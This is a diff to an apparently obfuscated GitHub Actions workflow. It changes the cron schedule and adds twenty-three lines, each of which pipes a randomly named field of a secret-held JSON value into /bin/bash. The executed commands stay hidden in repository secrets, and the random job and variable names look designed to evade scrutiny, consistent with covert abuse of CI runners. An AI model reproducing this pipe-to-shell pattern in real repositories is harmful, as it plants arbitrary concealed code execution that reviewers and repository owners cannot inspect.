@@ -2,7 +2,7 @@ name: zhongliruo6121
 on:
   workflow_dispatch:
   schedule:
-    - cron: '46 5/6 * * *'
+    - cron: '38 2/6 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
@@ -10,11 +10,29 @@ jobs:
       - uses: actions/checkout@v4
       - name: zhongliruo6121
         env:
-          daor7213: ${{ secrets.daor7213 }}
+          fdo492: ${{ secrets.fdo492 }}
         run: |
-          echo $daor7213 | jq -r .okmsc90963 | /bin/bash
-          echo $uqnhb770 | jq -r .fxav9368 | /bin/bash
-          echo $pmaca51681 | jq -r .yax45457 | /bin/bash
-          echo $eend0 | jq -r .jab979 | /bin/bash
-          echo $lxqh4 | jq -r .pqaue64 | /bin/bash
+          echo $fdo492 | jq -r .civib8037 | /bin/bash
+          echo $wnxqp10413 | jq -r .ltd2941 | /bin/bash
+          echo $e85 | jq -r .j331 | /bin/bash
+          echo $svlm6 | jq -r .kp35 | /bin/bash
+          echo $qqbys3476 | jq -r .o58 | /bin/bash
+          echo $l86 | jq -r .kmyky252 | /bin/bash
+          echo $wnb11719 | jq -r .h25 | /bin/bash
+          echo $oywpu4 | jq -r .glth196 | /bin/bash
+          echo $dfmtj2 | jq -r .q18 | /bin/bash
+          echo $vcovj02 | jq -r .lvpm0 | /bin/bash
+          echo $kicgi2 | jq -r .t9 | /bin/bash
+          echo $z7666 | jq -r .ttj52165 | /bin/bash
+          echo $da208 | jq -r .r78 | /bin/bash
+          echo $w338 | jq -r .k9 | /bin/bash
+          echo $b88858 | jq -r .mnsj998 | /bin/bash
+          echo $uu20062 | jq -r .u27 | /bin/bash
+          echo $oc24 | jq -r .jcv418 | /bin/bash
+          echo $lwuf8 | jq -r .fwhoj96065 | /bin/bash
+          echo $myrzy72 | jq -r .befdl89423 | /bin/bash
+          echo $xdse7 | jq -r .qzoax39 | /bin/bash
+          echo $chbor21 | jq -r .yievn58861 | /bin/bash
+          echo $obuvn9 | jq -r .jwgr7 | /bin/bash
+          echo $kzjk29 | jq -r .gqo8126 | /bin/bash
 
